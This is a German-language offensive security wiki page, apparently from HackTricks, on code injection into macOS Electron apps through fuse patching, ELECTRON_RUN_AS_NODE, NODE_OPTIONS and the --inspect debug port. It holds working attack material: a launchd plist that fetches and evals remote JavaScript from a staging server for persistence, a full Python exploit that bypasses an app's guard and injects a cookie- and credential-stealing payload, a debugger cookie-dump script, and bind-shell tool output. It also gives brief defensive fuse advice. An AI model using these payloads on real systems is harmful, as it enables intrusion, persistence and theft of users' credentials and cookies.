# macOS Electron-Anwendungen Injection

{{#include ../../../banners/hacktricks-training.md}}

## Grundlegende Informationen

Wenn Sie nicht wissen, was Electron ist, finden Sie [**hier viele Informationen**](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). Aber für jetzt wissen Sie einfach, dass Electron **node** ausführt.\
Und node hat einige **Parameter** und **Umgebungsvariablen**, die verwendet werden können, um **anderen Code auszuführen**, abgesehen von der angegebenen Datei.

### Electron Fuses

Diese Techniken werden als Nächstes besprochen, aber in letzter Zeit hat Electron mehrere **Sicherheitsflags hinzugefügt, um sie zu verhindern**. Dies sind die [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses) und diese werden verwendet, um zu **verhindern**, dass Electron-Anwendungen in macOS **willkürlichen Code laden**:

- **`RunAsNode`**: Wenn deaktiviert, verhindert es die Verwendung der Umgebungsvariable **`ELECTRON_RUN_AS_NODE`**, um Code zu injizieren.
- **`EnableNodeCliInspectArguments`**: Wenn deaktiviert, werden Parameter wie `--inspect`, `--inspect-brk` nicht respektiert. Dies vermeidet diesen Weg, um Code zu injizieren.
- **`EnableEmbeddedAsarIntegrityValidation`**: Wenn aktiviert, wird die geladene **`asar`** **Datei** von macOS **validiert**. Dadurch wird **Code-Injection** verhindert, indem der Inhalt dieser Datei geändert wird.
- **`OnlyLoadAppFromAsar`**: Wenn dies aktiviert ist, wird anstelle der Suche in der folgenden Reihenfolge: **`app.asar`**, **`app`** und schließlich **`default_app.asar`** nur app.asar überprüft und verwendet, wodurch sichergestellt wird, dass es in Kombination mit dem **`embeddedAsarIntegrityValidation`** Fuse **unmöglich** ist, **nicht-validierten Code** zu **laden**.
- **`LoadBrowserProcessSpecificV8Snapshot`**: Wenn aktiviert, verwendet der Browserprozess die Datei namens `browser_v8_context_snapshot.bin` für seinen V8-Snapshot.

Ein weiterer interessanter Fuse, der die Code-Injection nicht verhindert, ist:

- **EnableCookieEncryption**: Wenn aktiviert, wird der Cookie-Speicher auf der Festplatte mit kryptografischen Schlüsseln auf Betriebssystemebene verschlüsselt.

### Überprüfen der Electron Fuses

Sie können **diese Flags** von einer Anwendung aus überprüfen mit:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Modifying Electron Fuses

Wie die [**Dokumentation erwähnt**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), sind die Konfigurationen der **Electron Fuses** innerhalb der **Electron-Binärdatei** konfiguriert, die irgendwo die Zeichenfolge **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`** enthält.

In macOS-Anwendungen befindet sich dies typischerweise in `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
Sie können diese Datei in [https://hexed.it/](https://hexed.it/) laden und nach der vorherigen Zeichenfolge suchen. Nach dieser Zeichenfolge sehen Sie in ASCII eine Zahl "0" oder "1", die angibt, ob jede Sicherung deaktiviert oder aktiviert ist. Ändern Sie einfach den Hex-Code (`0x30` ist `0` und `0x31` ist `1`), um **die Sicherungswerte zu ändern**.

<figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>

Beachten Sie, dass die Anwendung nicht ausgeführt wird, wenn Sie versuchen, die **`Electron Framework`**-Binärdatei innerhalb einer Anwendung mit diesen modifizierten Bytes **zu überschreiben**.

## RCE Code zu Electron-Anwendungen hinzufügen

Es könnte **externe JS/HTML-Dateien** geben, die eine Electron-App verwendet, sodass ein Angreifer Code in diese Dateien injizieren könnte, deren Signatur nicht überprüft wird, und willkürlichen Code im Kontext der App ausführen kann.

> [!CAUTION]
> Es gibt jedoch derzeit 2 Einschränkungen:
>
> - Die Berechtigung **`kTCCServiceSystemPolicyAppBundles`** ist **erforderlich**, um eine App zu ändern, sodass dies standardmäßig nicht mehr möglich ist.
> - Die kompilierte **`asap`**-Datei hat normalerweise die Sicherungen **`embeddedAsarIntegrityValidation`** `und` **`onlyLoadAppFromAsar`** `aktiviert`
>
> Dies macht diesen Angriffsweg komplizierter (oder unmöglich).

Beachten Sie, dass es möglich ist, die Anforderung von **`kTCCServiceSystemPolicyAppBundles`** zu umgehen, indem Sie die Anwendung in ein anderes Verzeichnis (wie **`/tmp`**) kopieren, den Ordner **`app.app/Contents`** in **`app.app/NotCon`** umbenennen, die **asar**-Datei mit Ihrem **bösartigen** Code **modifizieren**, sie wieder in **`app.app/Contents`** umbenennen und sie ausführen.

Sie können den Code aus der asar-Datei mit entpacken:
```bash
npx asar extract app.asar app-decomp
```
Und packe es wieder ein, nachdem du es mit folgendem modifiziert hast:
```bash
npx asar pack app-decomp app-new.asar
```
## RCE mit ELECTRON_RUN_AS_NODE

Laut [**den Dokumenten**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node) wird der Prozess, wenn diese Umgebungsvariable gesetzt ist, als normaler Node.js-Prozess gestartet.
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
> [!CAUTION]
> Wenn die Fuse **`RunAsNode`** deaktiviert ist, wird die Umgebungsvariable **`ELECTRON_RUN_AS_NODE`** ignoriert, und dies wird nicht funktionieren.

### Injection aus der App Plist

Wie [**hier vorgeschlagen**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), könnten Sie diese Umgebungsvariable in einer Plist missbrauchen, um Persistenz aufrechtzuerhalten:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE mit `NODE_OPTIONS`

Sie können die Nutzlast in einer anderen Datei speichern und sie ausführen:
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
> [!CAUTION]
> Wenn die Sicherung **`EnableNodeOptionsEnvironmentVariable`** **deaktiviert** ist, wird die App die Umgebungsvariable **NODE_OPTIONS** beim Start **ignorieren**, es sei denn, die Umgebungsvariable **`ELECTRON_RUN_AS_NODE`** ist gesetzt, die ebenfalls **ignoriert** wird, wenn die Sicherung **`RunAsNode`** deaktiviert ist.
>
> Wenn Sie **`ELECTRON_RUN_AS_NODE`** nicht setzen, erhalten Sie den **Fehler**: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`

### Injection aus der App Plist

Sie könnten diese Umgebungsvariable in einer plist missbrauchen, um Persistenz zu gewährleisten, indem Sie diese Schlüssel hinzufügen:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE mit Inspektion

Laut [**diesem**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f) Artikel, wenn Sie eine Electron-Anwendung mit Flags wie **`--inspect`**, **`--inspect-brk`** und **`--remote-debugging-port`** ausführen, wird ein **Debug-Port geöffnet**, sodass Sie sich damit verbinden können (zum Beispiel von Chrome in `chrome://inspect`) und Sie werden in der Lage sein, **Code darauf zu injizieren** oder sogar neue Prozesse zu starten.\
Zum Beispiel:
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
In [**diesem Blogbeitrag**](https://hackerone.com/reports/1274695) wird dieses Debugging ausgenutzt, um einen headless chrome **willkürliche Dateien an willkürlichen Orten herunterzuladen**.

> [!TIP]
> Wenn eine App ihre eigene Methode hat, um zu überprüfen, ob Umgebungsvariablen oder Parameter wie `--inspect` gesetzt sind, könntest du versuchen, dies zur Laufzeit mit dem Argument `--inspect-brk` zu **umgehen**, das die Ausführung zu Beginn der App **stoppt** und einen Bypass ausführt (zum Beispiel durch Überschreiben der Argumente oder der Umgebungsvariablen des aktuellen Prozesses).

Das Folgende war ein Exploit, bei dem durch Überwachung und Ausführung der App mit dem Parameter `--inspect-brk` das benutzerdefinierte Schutzsystem umgangen werden konnte (Überschreiben der Parameter des Prozesses, um `--inspect-brk` zu entfernen) und dann ein JS-Payload injiziert wurde, um Cookies und Anmeldeinformationen aus der App zu extrahieren:
```python
import asyncio
import websockets
import json
import requests
import os
import psutil
from time import sleep

INSPECT_URL = None
CONT = 0
CONTEXT_ID = None
NAME = None
UNIQUE_ID = None

JS_PAYLOADS = """
var { webContents } = require('electron');
var fs = require('fs');

var wc = webContents.getAllWebContents()[0]


function writeToFile(filePath, content) {
const data = typeof content === 'string' ? content : JSON.stringify(content, null, 2);

fs.writeFile(filePath, data, (err) => {
if (err) {
console.error(`Error writing to file ${filePath}:`, err);
} else {
console.log(`File written successfully at ${filePath}`);
}
});
}

function get_cookies() {
intervalIdCookies = setInterval(() => {
console.log("Checking cookies...");
wc.session.cookies.get({})
.then((cookies) => {
tokenCookie = cookies.find(cookie => cookie.name === "token");
if (tokenCookie){
writeToFile("/tmp/cookies.txt", cookies);
clearInterval(intervalIdCookies);
wc.executeJavaScript(`alert("Cookies stolen and written to /tmp/cookies.txt")`);
}
})
}, 1000);
}

function get_creds() {
in_location = false;
intervalIdCreds = setInterval(() => {
if (wc.mainFrame.url.includes("https://www.victim.com/account/login")) {
in_location = true;
console.log("Injecting creds logger...");
wc.executeJavaScript(`
(function() {
email = document.getElementById('login_email_id');
password = document.getElementById('login_password_id');
if (password && email) {
return email.value+":"+password.value;
}
})();
`).then(result => {
writeToFile("/tmp/victim_credentials.txt", result);
})
}
else if (in_location) {
wc.executeJavaScript(`alert("Creds stolen and written to /tmp/victim_credentials.txt")`);
clearInterval(intervalIdCreds);
}
}, 10); // Check every 10ms
setTimeout(() => clearInterval(intervalId), 20000); // Stop after 20 seconds
}

get_cookies();
get_creds();
console.log("Payloads injected");
"""

async def get_debugger_url():
"""
Fetch the local inspector's WebSocket URL from the JSON endpoint.
Assumes there's exactly one debug target.
"""
global INSPECT_URL

url = "http://127.0.0.1:9229/json"
response = requests.get(url)
data = response.json()
if not data:
raise RuntimeError("No debug targets found on port 9229.")
# data[0] should contain an object with "webSocketDebuggerUrl"
ws_url = data[0].get("webSocketDebuggerUrl")
if not ws_url:
raise RuntimeError("webSocketDebuggerUrl not found in inspector data.")
INSPECT_URL = ws_url


async def monitor_victim():
print("Monitoring victim process...")
found = False
while not found:
sleep(1)  # Check every second
for process in psutil.process_iter(attrs=['pid', 'name']):
try:
# Check if the process name contains "victim"
if process.info['name'] and 'victim' in process.info['name']:
found = True
print(f"Found victim process (PID: {process.info['pid']}). Terminating...")
os.kill(process.info['pid'], 9)  # Force kill the process
except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
# Handle processes that might have terminated or are inaccessible
pass
os.system("open /Applications/victim.app --args --inspect-brk")

async def bypass_protections():
global CONTEXT_ID, NAME, UNIQUE_ID
print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]

sleep(1)

await send_cmd(ws, "Debugger.enable", {"maxScriptsCacheSize": 10000000})

await send_cmd(ws, "Profiler.enable")

await send_cmd(ws, "Debugger.setBlackboxPatterns", {"patterns": ["/node_modules/|/browser_components/"], "skipAnonnymous": False})

await send_cmd(ws, "Runtime.runIfWaitingForDebugger")

await send_cmd(ws, "Runtime.executionContextCreated", get_first=False, params={"context": {"id": CONTEXT_ID, "origin": "", "name": NAME, "uniqueId": UNIQUE_ID, "auxData": {"isDefault": True}}})

code_to_inject = """process['argv'] = ['/Applications/victim.app/Contents/MacOS/victim']"""
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression": code_to_inject, "uniqueContextId":UNIQUE_ID})
print("Injected code to bypass protections")


async def js_payloads():
global CONT, CONTEXT_ID, NAME, UNIQUE_ID

print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]
await send_cmd(ws, "Runtime.compileScript", get_first=False, params={"expression":JS_PAYLOADS,"sourceURL":"","persistScript":False,"executionContextId":1})
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression":JS_PAYLOADS,"objectGroup":"console","includeCommandLineAPI":True,"silent":False,"returnByValue":False,"generatePreview":True,"userGesture":False,"awaitPromise":False,"replMode":True,"allowUnsafeEvalBlockedByCSP":True,"uniqueContextId":UNIQUE_ID})



async def main():
await monitor_victim()
sleep(3)
await get_debugger_url()
await bypass_protections()

sleep(7)

await js_payloads()



async def send_cmd(ws, method, get_first=False, params={}):
"""
Send a command to the inspector and read until we get a response with matching "id".
"""
global CONT

CONT += 1

# Send the command
await ws.send(json.dumps({"id": CONT, "method": method, "params": params}))
sleep(0.4)

# Read messages until we get our command result
while True:
response = await ws.recv()
data = json.loads(response)

# Print for debugging
print(f"[{method} / {CONT}] ->", data)

if get_first:
return data

# If this message is a response to our command (by matching "id"), break
if data.get("id") == CONT:
return data

# Otherwise it's an event or unrelated message; keep reading

if __name__ == "__main__":
asyncio.run(main())
```
> [!CAUTION]
> Wenn die Sicherung **`EnableNodeCliInspectArguments`** deaktiviert ist, wird die App **Node-Parameter** (wie `--inspect`) beim Start ignorieren, es sei denn, die Umgebungsvariable **`ELECTRON_RUN_AS_NODE`** ist gesetzt, die ebenfalls **ignoriert** wird, wenn die Sicherung **`RunAsNode`** deaktiviert ist.
>
> Sie können jedoch immer noch den **Electron-Parameter `--remote-debugging-port=9229`** verwenden, aber die vorherige Payload funktioniert nicht, um andere Prozesse auszuführen.

Mit dem Parameter **`--remote-debugging-port=9222`** ist es möglich, einige Informationen aus der Electron-App zu stehlen, wie die **Historie** (mit GET-Befehlen) oder die **Cookies** des Browsers (da sie im Browser **entschlüsselt** sind und es einen **JSON-Endpunkt** gibt, der sie bereitstellt).

Sie können lernen, wie man das macht, [**hier**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) und [**hier**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) und das automatische Tool [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) oder ein einfaches Skript wie:
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
### Injection from the App Plist

Sie könnten diese Umgebungsvariable in einer plist missbrauchen, um Persistenz zu gewährleisten, indem Sie diese Schlüssel hinzufügen:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## TCC Bypass abusing Older Versions

> [!TIP]
> Der TCC-Daemon von macOS überprüft nicht die ausgeführte Version der Anwendung. Wenn Sie also **keinen Code in eine Electron-Anwendung injizieren können** mit einer der vorherigen Techniken, könnten Sie eine frühere Version der APP herunterladen und Code darauf injizieren, da sie weiterhin die TCC-Berechtigungen erhält (es sei denn, der Trust Cache verhindert dies).

## Run non JS Code

Die vorherigen Techniken ermöglichen es Ihnen, **JS-Code innerhalb des Prozesses der Electron-Anwendung auszuführen**. Denken Sie jedoch daran, dass die **Kindprozesse unter demselben Sandbox-Profil** wie die übergeordnete Anwendung ausgeführt werden und **ihre TCC-Berechtigungen erben**.\
Wenn Sie also Berechtigungen missbrauchen möchten, um beispielsweise auf die Kamera oder das Mikrofon zuzugreifen, könnten Sie einfach **eine andere Binärdatei aus dem Prozess ausführen**.

## Notable Electron macOS Vulnerabilities (2023-2024)

### CVE-2023-44402 – ASAR integrity bypass

Electron ≤22.3.23 und verschiedene 23-27 Vorabversionen ermöglichten es einem Angreifer mit Schreibzugriff auf den Ordner `.app/Contents/Resources`, die `embeddedAsarIntegrityValidation` **und** `onlyLoadAppFromAsar` Fuses zu umgehen. Der Fehler war eine *Dateitypverwirrung* im Integritätsprüfer, die es ermöglichte, ein gestaltetes **Verzeichnis mit dem Namen `app.asar`** anstelle des validierten Archivs zu laden, sodass jeder JavaScript-Code, der in diesem Verzeichnis platziert wurde, beim Start der App ausgeführt wurde. Selbst Anbieter, die die Härtungsrichtlinien befolgt und beide Fuses aktiviert hatten, waren daher weiterhin auf macOS anfällig.

Patchte Electron-Versionen: **22.3.24**, **24.8.3**, **25.8.1**, **26.2.1** und **27.0.0-alpha.7**. Angreifer, die eine Anwendung mit einer älteren Version finden, können `Contents/Resources/app.asar` mit ihrem eigenen Verzeichnis überschreiben, um Code mit den TCC-Berechtigungen der Anwendung auszuführen.

### 2024 “RunAsNode” / “enableNodeCliInspectArguments” CVE cluster

Im Januar 2024 hob eine Reihe von CVEs (CVE-2024-23738 bis CVE-2024-23743) hervor, dass viele Electron-Apps mit den Fuses **RunAsNode** und **EnableNodeCliInspectArguments** weiterhin aktiviert ausgeliefert werden. Ein lokaler Angreifer kann daher das Programm mit der Umgebungsvariable `ELECTRON_RUN_AS_NODE=1` oder Flags wie `--inspect-brk` neu starten, um es in einen *generischen* Node.js-Prozess zu verwandeln und alle Sandbox- und TCC-Berechtigungen der Anwendung zu erben.

Obwohl das Electron-Team die "kritische" Bewertung bestritt und darauf hinwies, dass ein Angreifer bereits lokale Codeausführung benötigt, ist das Problem während der Post-Exploitation weiterhin wertvoll, da es jedes anfällige Electron-Bundle in eine *living-off-the-land* Binärdatei verwandelt, die z.B. Kontakte, Fotos oder andere sensible Ressourcen lesen kann, die zuvor der Desktop-App gewährt wurden.

Defensive Richtlinien von den Electron-Maintainern:

* Deaktivieren Sie die Fuses `RunAsNode` und `EnableNodeCliInspectArguments` in Produktionsversionen.
* Verwenden Sie die neuere **UtilityProcess** API, wenn Ihre Anwendung legitim einen Hilfsprozess in Node.js benötigt, anstatt diese Fuses erneut zu aktivieren.

## Automatic Injection

- [**electroniz3r**](https://github.com/r3ggi/electroniz3r)

Das Tool [**electroniz3r**](https://github.com/r3ggi/electroniz3r) kann einfach verwendet werden, um **anfällige Electron-Anwendungen** zu finden und Code in sie zu injizieren. Dieses Tool wird versuchen, die **`--inspect`** Technik zu verwenden:

Sie müssen es selbst kompilieren und können es so verwenden:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
- [https://github.com/boku7/Loki](https://github.com/boku7/Loki)

Loki wurde entwickelt, um Electron-Anwendungen zu backdooren, indem die JavaScript-Dateien der Anwendungen durch die Loki Command & Control JavaScript-Dateien ersetzt werden.


## References

- [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
- [https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85](https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85)
- [https://www.electronjs.org/blog/statement-run-as-node-cves](https://www.electronjs.org/blog/statement-run-as-node-cves)
- [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

{{#include ../../../banners/hacktricks-training.md}}
